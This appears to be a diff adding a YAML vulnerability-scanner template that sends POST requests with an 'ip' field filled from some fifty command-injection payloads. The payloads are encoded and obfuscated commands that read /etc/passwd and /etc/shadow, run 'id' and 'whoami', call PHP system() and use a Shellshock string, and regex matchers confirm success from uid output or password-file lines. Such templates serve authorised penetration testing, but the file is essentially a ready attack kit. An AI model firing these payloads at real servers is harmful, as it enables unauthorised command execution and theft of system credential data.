@@ -1,0 +1,96 @@
+
+id: command-injection
+
+info:
+  name: Command Injection Template
+  author: suriryuk
+  severity: Critical
+  description: Determine whether a command injection attack was successful.
+  tags: RCE, cmdi
+
+http:
+  - pre-condition:
+    - type: dsl
+      dsl:
+        - "method == POST"
+        - "len(body) > 0"
+      condition: and
+
+  - raw:
+    - |
+      POST {{BaseURL}} HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+
+      ip={{injection}}&Submit=Submit
+
+    payloads:
+      injection:
+        - "%26cat%24IFS%2Fetc%2Fpasswd"
+        - "`id`"
+        - "<!--#exec cmd=&quot;/usr/bin/id; &quot;-->"
+        - "|cat$IFS/etc/passwd"
+        - "%27id"
+        - "cat%24u%20%2Fetc%24u%2Fpasswd"
+        - "%3Bsystem%28%22id%22%29"
+        - "a);id|"
+        - "%7Ccat%3C%2Fetc%2Fpasswd"
+        - "%29%7Cid"
+        - "||cat%24u+/etc$u/passwd"
+        - "a);/usr/bin/id;"
+        - "%27id%27"
+        - ";system('cat%20/etc/passwd')"
+        - "%3Bcat%24u%20%2Fetc%24u%2Fpasswd%24u"
+        - "&&/usr/bin/id&&"
+        - "&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+echo${IFS}\"Rce\"${IFS}&&cat${IFS}/etc/passwd"
+        - "%26id%3B"
+        - "<!--#exec cmd=&quot;/bin/cat /etc/shadow&quot;-->"
+        - "cat%20/etc/passwd"
+        - "cat /etc$u/passwd"
+        - "%26cat%24u%20%2Fetc%24u%2Fpasswd%24u"
+        - "a%29%3Bid"
+        - "<!--#exec cmd=&quot;/bin/cat /etc/shadow&quot;-->"
+        - "%26id"
+        - "%27%0Awhoami%0A%27"
+        - "&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;"
+        - "%2Fusr%24u%2Fbin%2Fid%24u"
+        - "%3B%20cat%24u%20%2Fetc%24u%2Fpasswd"
+        - "%0aid"
+        - "&&cat%20/etc/passwd"
+        - "%3Bsystem%28cat%20%2Fetc%2Fpasswd%29"
+        - "%7Ccat%20/etc/passwd"
+        - "||cat%24u+/etc$u/passwd"
+        - "%26id"
+        - "||/usr/bin/id|"
+        - "a)|id"
+        - "<?php echo system(\"id\");?>"
+        - "||cat /etc/passwd"
+        - "%3B%2Fusr%2Fbin%2Fid%3B"
+        - "<?php system(\"id\");?>"
+        - "%3Bcat%2B%2Fetc%24u%2Fpasswd"
+        - "||cat%24u%20%2Fetc%24u%2Fpasswd%24u"
+        - "${IFS}id"
+        - "%3Bcat%24u%20%2Fetc%24u%2Fpasswd%24u"
+        - "a|id"
+        - "<?php system(\"cat /etc/passwd\");?>"
+        - "%29%3Bid"
+        - "%3B%20cat%24u%20%2Fetc%24u%2Fpasswd%24u"
+        - "() { :;}; /bin/bash -c \"sleep 3 && echo vulnerable 3\""
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: regex
+        name: attack-success
+        regex:
+          - "uid=[^\\n]+ gid=[^\\n]+ groups=[^\\n]+"
+          - "root:x:[0-9]+:[0-9]+:root:\\/root:"
+          - "root:\\*:[0-9]+:[0-9]+:[0-9]+:[0-9]+:::"
+
+      - type: word
+        name: attack-success-id
+        words:
+          - "www-data"
+        part: body
+        
